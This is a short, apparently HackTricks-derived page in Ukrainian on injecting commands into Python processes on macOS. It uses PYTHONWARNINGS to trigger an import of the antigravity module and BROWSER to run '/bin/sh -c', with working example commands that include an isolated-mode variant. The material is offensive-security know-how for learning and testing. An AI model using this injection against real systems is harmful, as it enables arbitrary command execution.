# Ін’єкція в Python-застосунки macOS

{{#include ../../../banners/hacktricks-training.md}}

## Через змінні середовища `PYTHONWARNINGS` і `BROWSER`

Якщо зловмисник може контролювати середовище Python-процесу, комбінація `PYTHONWARNINGS` і `BROWSER` може спричинити виконання команд, коли Python імпортує модуль `antigravity` під час обробки спеціально сформованої опції попередження. Техніка використовує те, що `antigravity` відкриває URL за допомогою модуля Python `webbrowser`, який враховує змінну середовища `BROWSER`.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## References

- [1] [Злам за допомогою змінних середовища - elttam](https://www.elttam.com/blog/env/)
{{#include ../../../banners/hacktricks-training.md}}
